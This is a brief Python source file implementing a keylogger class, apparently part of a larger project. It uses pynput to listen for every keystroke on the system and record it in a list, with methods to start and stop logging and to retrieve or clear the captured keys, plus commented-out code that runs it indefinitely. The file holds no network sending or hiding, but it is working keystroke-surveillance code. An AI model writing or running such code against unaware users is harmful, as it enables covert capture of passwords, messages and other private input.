from pynput import keyboard
from .interfaces import KeyLogger


class KeyLoggerService(KeyLogger):
    def __init__(self) -> None:
        self.__listener = None
        self.__key_records: list[str] = []

    def __on_press(self, key) -> None:
        try:
            self.__key_records.append(key.char)
        except AttributeError:
            self.__key_records.append(str(key)[4:])
        # print(self.__key_records)

    def start_logging(self) -> None:
        self.__listener = keyboard.Listener(on_press=self.__on_press)
        self.__listener.start()

    def stop_logging(self) -> None:
        self.__listener.stop()

    def get_logged_keys(self) -> list[str]:
        return self.__key_records
    
    def clear_log(self) -> None:
        self.__key_records: list [str] = []

# k = KeyLoggerService()
# k.start_logging()

# while True:
#     pass
